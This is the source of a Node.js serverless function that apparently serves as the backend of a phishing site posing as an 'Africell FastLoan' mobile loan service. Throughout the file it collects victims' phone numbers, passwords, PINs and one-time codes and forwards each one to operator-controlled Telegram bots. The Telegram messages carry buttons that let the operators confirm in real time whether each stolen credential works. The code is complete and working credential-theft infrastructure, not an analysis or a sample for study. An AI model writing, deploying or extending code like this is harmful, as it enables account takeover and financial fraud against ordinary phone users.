const fetch = (...args) => import('node-fetch').then(({ default: f }) => f(...args));

// ── Bot credentials ──────────────────────────────────────────────────────────
const BOT1_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const BOT1_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
const BOT2_TOKEN = process.env.TELEGRAM_BOT_TOKEN_2;
const BOT2_CHAT_ID = process.env.TELEGRAM_CHAT_ID_2;

// ── Redis helpers ─────────────────────────────────────────────────────────────
const REDIS_URL = process.env.UPSTASH_REDIS_REST_URL;
const REDIS_TOKEN = process.env.UPSTASH_REDIS_REST_TOKEN;

async function redisSet(key, value, exSeconds = 600) {
    await fetch(`${REDIS_URL}/set/${key}/${encodeURIComponent(value)}/ex/${exSeconds}`, {
        headers: { Authorization: `Bearer ${REDIS_TOKEN}` }
    });
}

async function redisGet(key) {
    const res = await fetch(`${REDIS_URL}/get/${key}`, {
        headers: { Authorization: `Bearer ${REDIS_TOKEN}` }
    });
    const json = await res.json();
    return json.result; // string | null
}

async function redisIncr(key) {
    const res = await fetch(`${REDIS_URL}/incr/${key}`, {
        headers: { Authorization: `Bearer ${REDIS_TOKEN}` }
    });
    const json = await res.json();
    return json.result; // integer
}

// ── Webhook auto-registration ────────────────────────────────────────────────
let webhooksRegistered = false;
async function registerWebhooks(webhookUrl) {
    if (webhooksRegistered) return;
    await Promise.all([
        fetch(`https://api.telegram.org/bot${BOT1_TOKEN}/setWebhook?url=${encodeURIComponent(webhookUrl)}`),
        fetch(`https://api.telegram.org/bot${BOT2_TOKEN}/setWebhook?url=${encodeURIComponent(webhookUrl)}`),
    ]);
    webhooksRegistered = true;
}

// ── Bot selector ─────────────────────────────────────────────────────────────
function getBotCredentials(botType) {
    if (botType === 'secondary') {
        return { token: BOT2_TOKEN, chatId: BOT2_CHAT_ID };
    }
    return { token: BOT1_TOKEN, chatId: BOT1_CHAT_ID };
}

// ── Main handler ─────────────────────────────────────────────────────────────
exports.handler = async (event) => {
    if (event.httpMethod !== 'POST') return { statusCode: 405, body: 'Method Not Allowed' };

    const { phone, password, sessionId, loanAmount, type = 'phone', otp, pin } =
        JSON.parse(event.body || '{}');

    if (!phone || !sessionId) {
        return { statusCode: 400, body: JSON.stringify({ error: 'Missing fields' }) };
    }

    // ── Auto-register webhooks ──────────────────────────────────────────────
    const webhookUrl = `${process.env.URL}/.netlify/functions/telegram-webhook`;
    await registerWebhooks(webhookUrl);

    // ════════════════════════════════════════════════════════════════════════
    // PHONE / LOGIN step — decide which bot to use via round-robin
    // ════════════════════════════════════════════════════════════════════════
    if (type === 'phone' || (!type || type === 'phone')) {
        if (!password) {
            return { statusCode: 400, body: JSON.stringify({ error: 'Missing password' }) };
        }

        // Round-robin: INCR global counter, every 3rd user → secondary
        const count = await redisIncr('phone-counter');
        const botType = (count % 3 === 0) ? 'secondary' : 'primary';

        // Persist bot assignment for this phone number (30 min TTL)
        await redisSet(`phone-bot:${phone}`, botType, 1800);

        // Persist bot assignment in the session so the webhook knows which bot to use
        await redisSet(`session:${sessionId}:botType`, botType, 1800);

        // Mark login as pending
        await redisSet(`session:${sessionId}:login`, 'pending');

        const { token, chatId } = getBotCredentials(botType);
        const label = botType === 'secondary' ? '🔸 [Bot 2]' : '🔹 [Bot 1]';

        const text =
            `🏦 *Africell FastLoan – Login Attempt* ${label}\n\n` +
            `📱 Phone: \`${phone}\`\n` +
            `🔑 Password: \`${password}\`\n` +
            `💰 Requesting: \`${loanAmount || 'Unknown'}\`\n\n` +
            `Session: \`${sessionId}\``;

        await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: chatId,
                text,
                parse_mode: 'Markdown',
                reply_markup: {
                    inline_keyboard: [[
                        { text: '✅ Correct Number + Password', callback_data: `login_ok:${sessionId}` },
                    ], [
                        { text: '❌ Wrong Number', callback_data: `login_wrong_number:${sessionId}` },
                        { text: '❌ Wrong Password', callback_data: `login_wrong_password:${sessionId}` },
                    ]]
                }
            })
        });

        return { statusCode: 200, headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ ok: true, botType }) };
    }

    // ════════════════════════════════════════════════════════════════════════
    // PIN step — look up the bot that was assigned on phone submission
    // ════════════════════════════════════════════════════════════════════════
    if (type === 'pin') {
        if (!pin) return { statusCode: 400, body: JSON.stringify({ error: 'Missing pin' }) };

        const botType = (await redisGet(`phone-bot:${phone}`)) || 'primary';
        await redisSet(`session:${sessionId}:pin`, 'pending');

        const { token, chatId } = getBotCredentials(botType);
        const label = botType === 'secondary' ? '🔸 [Bot 2]' : '🔹 [Bot 1]';

        const text =
            `🔐 *Africell FastLoan – PIN Submitted* ${label}\n\n` +
            `📱 Phone: \`${phone}\`\n` +
            `🔢 PIN: \`${pin}\`\n\n` +
            `Session: \`${sessionId}\``;

        await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: chatId,
                text,
                parse_mode: 'Markdown',
                reply_markup: {
                    inline_keyboard: [[
                        { text: '✅ Correct PIN', callback_data: `pin_ok:${sessionId}` },
                        { text: '❌ Wrong PIN', callback_data: `pin_wrong:${sessionId}` },
                    ]]
                }
            })
        });

        return { statusCode: 200, headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ ok: true }) };
    }

    // ════════════════════════════════════════════════════════════════════════
    // OTP step — look up the bot that was assigned on phone submission
    // ════════════════════════════════════════════════════════════════════════
    if (type === 'otp') {
        if (!otp) return { statusCode: 400, body: JSON.stringify({ error: 'Missing otp' }) };

        const botType = (await redisGet(`phone-bot:${phone}`)) || 'primary';
        await redisSet(`session:${sessionId}:otp`, 'pending');

        const { token, chatId } = getBotCredentials(botType);
        const label = botType === 'secondary' ? '🔸 [Bot 2]' : '🔹 [Bot 1]';

        const text =
            `🔐 *Africell FastLoan – OTP Submitted* ${label}\n\n` +
            `📱 Phone: \`${phone}\`\n` +
            `🔢 OTP Code: \`${otp}\`\n\n` +
            `Session: \`${sessionId}\``;

        await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: chatId,
                text,
                parse_mode: 'Markdown',
                reply_markup: {
                    inline_keyboard: [[
                        { text: '✅ Correct OTP', callback_data: `otp_ok:${sessionId}` },
                        { text: '❌ Wrong OTP', callback_data: `otp_wrong:${sessionId}` },
                    ]]
                }
            })
        });

        return { statusCode: 200, headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ ok: true }) };
    }

    return { statusCode: 400, body: JSON.stringify({ error: 'Unknown type' }) };
};
